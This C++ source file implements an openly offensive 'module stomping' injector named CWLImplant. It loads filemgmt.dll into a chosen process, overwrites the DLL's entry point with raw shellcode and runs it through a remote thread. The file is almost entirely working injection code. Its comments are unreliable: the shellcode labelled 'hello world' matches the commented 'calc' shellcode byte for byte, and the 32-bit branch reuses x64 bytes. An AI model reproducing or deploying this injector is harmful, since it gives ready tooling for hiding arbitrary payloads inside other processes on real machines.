#include <Windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <string>

HMODULE FindModuleBase(HANDLE hProcess) {

	HMODULE hModuleList[1024];
	wchar_t moduleName[MAX_PATH];
	DWORD cb = sizeof(hModuleList);
	DWORD cbNeeded = 0;

	if (EnumProcessModulesEx(hProcess, hModuleList, sizeof(hModuleList), &cbNeeded, LIST_MODULES_64BIT)) {
		int getLastErr = GetLastError();
		for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
			if (GetModuleFileNameEx(hProcess, hModuleList[i], moduleName, (sizeof(moduleName) / sizeof(DWORD)))) {
				if (wcsstr(moduleName, L"filemgmt.dll") != nullptr) {
					return hModuleList[i];
					break;
				}
			}
		}
	}
	return 0;
}




LPVOID FindEntryPoint(HANDLE hProcess, HMODULE hModule) {
	LPVOID targetDLLHeader = { 0 };
	DWORD sizeOfHeader = 0x1000;
	targetDLLHeader = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeOfHeader);
	ReadProcessMemory(hProcess, (LPVOID)hModule, targetDLLHeader, sizeOfHeader, NULL);
	PIMAGE_DOS_HEADER dosHeder = (PIMAGE_DOS_HEADER)targetDLLHeader;
	PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetDLLHeader + dosHeder->e_lfanew);
	DWORD_PTR dllEntryPoint = ntHeaders->OptionalHeader.AddressOfEntryPoint;
	wprintf(L"[+] DllEntryPoint offset: %p\n", (LPVOID)dllEntryPoint);
	LPVOID dllEntryPointMem = (LPVOID)(dllEntryPoint + (DWORD_PTR)hModule);
	wprintf(L"[+] DllEntryPoint in memory: %p\n", dllEntryPointMem);
	return dllEntryPointMem;
}

BOOL ModuleStomp(unsigned char buf[], SIZE_T payloadSize, DWORD pid) {
	HANDLE hProcess = INVALID_HANDLE_VALUE;
	HANDLE hTargetModule = NULL;

#ifdef _WIN64
	LPCSTR targetLibrary = "C:\\temp\\modules\\64\\filemgmt.dll";
#else
	LPCSTR targetLibrary = "C:\\temp\\modules\\86\\filemgmt.dll";
#endif
	LPVOID memBase;
	HMODULE moduleBase;
	LPVOID entryPoint = { 0 };
	wprintf(L"[+] Opening the target process, pid: %d\n", pid);
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == INVALID_HANDLE_VALUE) {
		perror("[-] Couldn't find the target process\n");
		exit(-1);
	}

	size_t targetSize = lstrlenA(targetLibrary);
	memBase = VirtualAllocEx(hProcess, NULL, targetSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (memBase == 0) {
		printf("%d\n", GetLastError());
		perror("[-] Failed to allocate memory in target process\n");
		exit(-1);
	}
	wprintf(L"[+] Memory allocated at remote process address: %p\n", memBase);

	if (!WriteProcessMemory(hProcess, memBase, targetLibrary, targetSize, NULL)) {
		perror("[-] Failed to write module in target process memory\n");
		exit(-1);
	}
	wprintf(L"[+] DLL path written to the allocated memory\n");

	LPTHREAD_START_ROUTINE LoadModule = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
	if (LoadModule == NULL) {
		perror("[-] Couldn't find the module LoadLibraryA\n");
		exit(-1);
	}
	hTargetModule = CreateRemoteThread(hProcess, NULL, 0, LoadModule, memBase, 0, NULL);
	if (hTargetModule == INVALID_HANDLE_VALUE) {
		perror("[-] Failed to load module in target process memory\n");
		exit(-1);
	}
	wprintf(L"[+] Successfully loaded module in the memory...\n");
	WaitForSingleObject(hTargetModule, 2000);


	moduleBase = FindModuleBase(hProcess);
	if (moduleBase == 0) {
		perror("[-] Module is not loaded in the memory\n");
		exit(-1);
	}


	entryPoint = FindEntryPoint(hProcess, moduleBase);
	
	if (!WriteProcessMemory(hProcess, entryPoint, buf, payloadSize, NULL)) {
		perror("[-] Unable to write payload into the dll\n ");
		exit(-1);
	}
	wprintf(L"[+] Payload written to the entrypoint of target module...\n");
	CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)entryPoint, NULL, 0, 0);
	wprintf(L"[+] Payload Executed... \n");
	return TRUE;
}

int main(int argc, char* argv[]) {
	if (argc < 2) {
		wprintf(L"CWLImplant.exe pid\n");
		exit(-1);
	}
#ifdef _WIN64
	// Calc Shellcode
	//unsigned char buf[] =
	//	"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
	//	"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
	//	"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
	//	"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
	//	"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
	//	"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
	//	"\x48\x83\xec\x20\x41\xff\xd6";

	// hello world shellcode
	unsigned char buf[] = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
	"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
	"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
	"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
	"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
	"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
	"\x48\x83\xec\x20\x41\xff\xd6";
#else
	unsigned char buf[] =
		"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
	"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
	"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
	"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
	"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
	"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
	"\x48\x83\xec\x20\x41\xff\xd6";
#endif
	BOOL isSuccess;
	DWORD pid = atoi(argv[1]);
	if (pid == 0) {
		wprintf(L"[-] Invalid process id...\n");
		exit(-1);
	}
	SIZE_T payload_size = sizeof(buf);
	isSuccess = ModuleStomp(buf, payload_size, pid);
}